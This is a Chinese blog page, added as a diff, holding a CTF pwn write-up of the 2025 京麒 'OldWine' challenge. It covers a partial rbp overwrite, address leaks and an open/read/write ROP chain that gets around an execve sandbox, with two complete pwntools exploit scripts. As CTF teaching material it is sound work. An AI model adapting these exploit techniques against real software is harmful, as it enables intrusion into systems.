@@ -1,0 +1,788 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="N1mbus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2025京麒pwn题的oldwine复现">
+<meta property="og:type" content="article">
+<meta property="og:title" content="京麒——OldWine">
+<meta property="og:url" content="http://example.com/post/kyoki--oldwine-1yet2t.html">
+<meta property="og:site_name" content="N1mbus">
+<meta property="og:description" content="2025京麒pwn题的oldwine复现">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526153633-39ylc9y.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526153755-doma7u3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154040-e2qwd8o.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154219-m5yqkfg.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154245-yuxzkzi.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154534-8b6j5cu.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-27%20151452-20250528105710-v2vpyol.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-27%20165814-20250528105643-dhr6zrw.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528131133-qis17gi.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528131356-l3ywzid.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528131822-sso042c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528132518-9qs9mu1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250605151132-tboxdhh.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250607141359-9i1c9ib.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250607143507-38g6br7.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250607131017-7l4hgn6.png">
+<meta property="article:published_time" content="2025-06-07T14:41:34.000Z">
+<meta property="article:modified_time" content="2025-06-07T14:41:36.000Z">
+<meta property="article:author" content="N1mbus">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="2025京麒">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526153633-39ylc9y.png">
+  
+  
+  
+  <title>京麒——OldWine - N1mbus</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"HGQ2AAsXTVipJuHOCxNQPl8A-gzGzoHsz","app_key":"xkvgsYTbMeB59u2gc4HqxaBN","server_url":"https://hgq2aasx.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>N1mbus的摆烂日记</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">京麒——OldWine</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-06-07 14:41" pubdate>
+          2025年6月7日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          12 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">京麒——OldWine</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="京麒——OldWine"><a href="#京麒——OldWine" class="headerlink" title="京麒——OldWine"></a>京麒——OldWine</h1><p>不会打，太坐牢了，只能复现了qwq(没想到时间拖了这么久）</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>开了一个沙箱，把execve禁了</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526153633-39ylc9y.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后权限限制得很死</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526153755-doma7u3.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>也不给我们可以用的寄存器</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154040-e2qwd8o.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>在程序中给了我们两个选项</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154219-m5yqkfg.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154245-yuxzkzi.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>1是可以向栈上写东西</p>
+<p>如果输入2，就会调用一次leave然后回到菜单处</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250526154534-8b6j5cu.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>众所周知</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">leave = mov esp, ebp<br>		pop ebp<br></code></pre></td></tr></table></figure>
+
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我当时没有思路，看了wp之后，发现师傅们都是修改bp的后两位，使bp位于sp前</p>
+<p>终于，经过我不懈的调试，终于懂了这道题目该怎么做了</p>
+<p>首先这道题目一定得先链接出题人给的libc库，我开始使用的自己的库（开始还以为做栈上的题影响不大呢，看来自己见识的还是太少了），调试的时候rbp里面存放的值是1，导致我一直不知道其他师傅的wp里面写的覆盖rbp后两位然后让rbp位于rsp之前是怎么做到的</p>
+<p>这是使用的我自己的库</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-27%20151452-20250528105710-v2vpyol.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-05-27 151452"></p>
+<p>这是使用出题人给的库</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-05-27%20165814-20250528105643-dhr6zrw.png" srcset="/img/loading.gif" lazyload alt="屏幕截图 2025-05-27 165814"></p>
+<p>可以看到rbp里面放的东西完全不一样（但是为什么不同的库会导致rbp里面的值不一样我还不知道，要是有师傅知道，可以留言告诉我一下吗）</p>
+<p>然后我们之后就可以通过溢出使old_rbp的后两位覆盖为00，使得有一定机率之后让rbp小于等于rsp</p>
+<p>然后我们进入到read函数里面，可以看到</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528131133-qis17gi.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>执行完read函数返回时，只用了<code>ret=pop rip</code>​,所以返回地址现在是放在rsp里面的</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528131356-l3ywzid.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>然后，我们看一下在调用read函数之前的寄存器</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528131822-sso042c.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>我们看到，rsi寄存器(写入数据的地址)里面放的是<code>[rbp-0x10]+rcx</code>​，此时因为我们把rbp放到了rsp的前面，就可以通过read的溢出覆盖到rsp，而rsp里面存放的是返回地址，此时就算我们不知道程序中的具体位置，也可以覆盖返回地址后两位跳转到write进行泄露</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250528132518-9qs9mu1.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250605151132-tboxdhh.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>可以看到已经泄露出来东西了</p>
+<p>本来后续想用栈迁移写的，但是不知道为什么栈迁移不稳定的因素太多了，很难调试</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">io.sendline(b<span class="hljs-string">&#x27;64&#x27;</span>)<br>     io.sendlineafter(b<span class="hljs-string">&#x27;index: &#x27;</span>,b<span class="hljs-string">&#x27;16&#x27;</span>)<br>     io.send(p64(start+<span class="hljs-number">0x4300</span>))<span class="hljs-meta">#rsp=start+0x4300</span><br>     leave()<br>     <br>     cmd1(<span class="hljs-number">8</span>,<span class="hljs-number">16</span>,p64(start+<span class="hljs-number">0x4100</span>))<span class="hljs-meta">#rbp=start+0x4100</span><br>     leave()<br>     <br>     payload=b<span class="hljs-number">&#x27;f</span>lag<span class="hljs-string">&#x27;+b&#x27;</span>\x00<span class="hljs-string">&#x27;+b&#x27;</span>\x00<span class="hljs-string">&#x27;+b&#x27;</span>\x00<span class="hljs-string">&#x27;+b&#x27;</span>\x00&#x27;<br>     payload+=p64(start+<span class="hljs-number">0x14f5</span>)<br>     <br>     payload+=p64(rdi)+p64(start+<span class="hljs-number">0x40f8</span>)+p64(rsi)+p64(<span class="hljs-number">0</span>)+p64(rax)+p64(<span class="hljs-number">0x2</span>)+p64(syscall)<span class="hljs-meta">#open</span><br>     payload+=p64(rdi)+p64(<span class="hljs-number">0x3</span>)+p64(rsi)+p64(start+<span class="hljs-number">0x4400</span>)+p64(rax)+p64(<span class="hljs-number">0</span>)+p64(syscall)<span class="hljs-meta">#read</span><br>     payload+=p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(rsi)+p64(start+<span class="hljs-number">0x4400</span>)+p64(rax)+p64(<span class="hljs-number">0x1</span>)+p64(syscall)<span class="hljs-meta">#write</span><br>     <br>     cmd1(len(payload),<span class="hljs-number">8</span>,payload)<br>     <br>    <br>     cmd1(<span class="hljs-number">8</span>,<span class="hljs-number">0x210</span>,p64(start+<span class="hljs-number">0x4101</span>))<br>     <br>     print(<span class="hljs-string">&#x27;where is my flag&#x27;</span>)<br>     <br>     pause()<br></code></pre></td></tr></table></figure>
+
+<p>本来是这么写的，但是问题很多，栈迁移在一些情况下bp里面的值会被覆盖导致栈迁移失败，然后有一次到了我写的payload位置，但是不知道为什么，卡着动不了了，实在是不想调这个了，所以打算换一种方法写</p>
+<p>于是我看了一下，可以泄露出栈上面的一个地址，然后已知rbp的值末尾一定为00，如果我们把我们泄露出的栈上末尾改为00，相当于我们就获得了rbp的地址（这里的输出名字改了一下，原来的stack输出的其实是起始地址，现在的stack才是真正的栈上地址）</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250607141359-9i1c9ib.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>可以看到我们获得了rbp的地址，所以我们就可以把flag输入到栈上，然后由于我们循环进来的i让我们覆盖到了位于rsp的返回地址上，此时，我们再输入<code>cmd1(8,8*i,payload)</code>​就可以把payload放到返回地址上</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c">from pwn import*<br><span class="hljs-title function_">context</span><span class="hljs-params">(os=<span class="hljs-string">&#x27;linux&#x27;</span>,arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)</span><br><br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>def cmd(cmd):<br>    io.sendlineafter(b<span class="hljs-string">&#x27;2. stack pivoting\n&#x27;</span>,str(cmd))<br>    <br>def cmd1(size,index,con):<br>    cmd(<span class="hljs-number">1</span>)<br>    io.sendlineafter(b<span class="hljs-string">&#x27;size: &#x27;</span>,str(size))<br>    io.sendlineafter(b<span class="hljs-string">&#x27;index: &#x27;</span>,str(index))<br>    io.send(con)<br>    <br>def leave():<br>    cmd(<span class="hljs-number">2</span>)<br>    <br><br>cmd1(<span class="hljs-number">1</span>,<span class="hljs-number">16</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>leave()<br><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">2</span>,<span class="hljs-number">30</span>):<br>    cmd1(<span class="hljs-number">0x20</span>,i*<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x45&#x27;</span>)<br>    data=io.recv(<span class="hljs-number">0x18</span>).strip()<br>    print(<span class="hljs-string">&#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span>,data)<br>    <span class="hljs-keyword">if</span> b<span class="hljs-string">&#x27;stack&#x27;</span> not in data:<br>        data1=data[:<span class="hljs-number">16</span>]<br>        start=u64(data1[:<span class="hljs-number">6</span>].ljust(<span class="hljs-number">8</span>,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>        glibc=u64(data1[<span class="hljs-number">-8</span>:])<br>        <span class="hljs-built_in">stack</span>=u64(data[<span class="hljs-number">-8</span>:])&amp; ~<span class="hljs-number">0xff</span><br>        print(<span class="hljs-string">&#x27;stack:&#x27;</span>,hex(<span class="hljs-built_in">stack</span>))<br>        print(<span class="hljs-string">&#x27;glibc&#x27;</span>,hex(glibc))<br>        print(<span class="hljs-string">&#x27;start:&#x27;</span>,hex(start))<br>        libc_base=glibc-(<span class="hljs-number">0x7f24e43751ca</span><span class="hljs-number">-0x7f24e434b000</span>)<br>        start=start<span class="hljs-number">-0x144f</span><br>        <br>        bss=start+<span class="hljs-number">0x4200</span><br>        <span class="hljs-meta"># gdb.attach(io)</span><br>        io.recv()<br>        rdi=libc_base+<span class="hljs-number">0x000000000010f75b</span><br>        rsi=libc_base+<span class="hljs-number">0x0000000000110a4d</span><br>        rax=libc_base+<span class="hljs-number">0x00000000000dd237</span><br>        syscall=libc_base+<span class="hljs-number">0x0000000000012725b</span><br>        io.sendline(b<span class="hljs-string">&#x27;20&#x27;</span>)<br>        io.sendlineafter(b<span class="hljs-string">&#x27;index: &#x27;</span>,b<span class="hljs-string">&#x27;8&#x27;</span>)<br>        <span class="hljs-meta"># gdb.attach(io)</span><br>        io.send(b<span class="hljs-number">&#x27;f</span>lag<span class="hljs-string">&#x27;+b&#x27;</span>\x00<span class="hljs-string">&#x27;*4)</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        payload=p64(rdi)+p64(stack-0x8)+p64(rsi)+p64(0)+p64(rax)+p64(0x2)+p64(syscall)#open</span><br><span class="hljs-string">        payload+=p64(rdi)+p64(0x3)+p64(rsi)+p64(bss)+p64(rax)+p64(0)+p64(syscall)#read</span><br><span class="hljs-string">        payload+=p64(rdi)+p64(1)+p64(rsi)+p64(bss)+p64(rax)+p64(0x1)+p64(syscall)#write</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        cmd1(len(payload),8*i,payload)</span><br><span class="hljs-string">        </span><br><span class="hljs-string">        io.interactive()</span><br><span class="hljs-string">        </span><br><span class="hljs-string"></span><br><span class="hljs-string">io.interactive()</span><br></code></pre></td></tr></table></figure>
+
+<p>我本来把b’flag’的字符放在rbp上的，但是不知道为什么，会被覆盖，但是放在rbp-8处就不会被覆盖</p>
+<p>让后还有一个问题，我使用syscall后不会跳回来（使用<code>ROPgadget --binary pwn --only &#39;syscall&#39;</code>​找到的syscall就不会返回，</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250607143507-38g6br7.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+<p>没办法，我直接进libc.so.6里面找的可以返回的syscall</p>
+<p>太不容易了，终于调出来了(这个环境总把我写的东西覆盖掉qwq)</p>
+<p><img src="https://raw.githubusercontent.com/N1mbus-lock/Pic/main/Pic/image-20250607131017-7l4hgn6.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="category-chain-item">刷题记录</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
+      
+        <a href="/tags/2025%E4%BA%AC%E9%BA%92/" class="print-no-link">#2025京麒</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>京麒——OldWine</div>
+      <div>http://example.com/post/kyoki--oldwine-1yet2t.html</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>N1mbus</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年6月7日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2025年6月7日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/post/silent-thoughts-zrtgyp.html" title="碎碎念">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">碎碎念</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/post/hitcon-ctf------setjmp-xgw6m.html" title="HITCON CTF —— setjmp">
+                        <span class="hidden-mobile">HITCON CTF —— setjmp</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"HGQ2AAsXTVipJuHOCxNQPl8A-gzGzoHsz","appKey":"xkvgsYTbMeB59u2gc4HqxaBN","path":"window.location.pathname","placeholder":"说点什么吧","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
